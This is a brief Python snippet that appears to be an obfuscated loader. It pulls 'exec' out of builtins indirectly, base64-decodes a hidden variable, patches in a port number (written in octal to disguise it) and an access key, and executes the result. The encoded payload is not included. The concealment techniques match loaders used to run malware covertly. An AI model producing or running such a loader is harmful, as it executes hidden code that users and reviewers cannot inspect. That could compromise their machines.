import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "7dc78b63-e9b3-4f35-b1c9-41c4d11e24bc")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)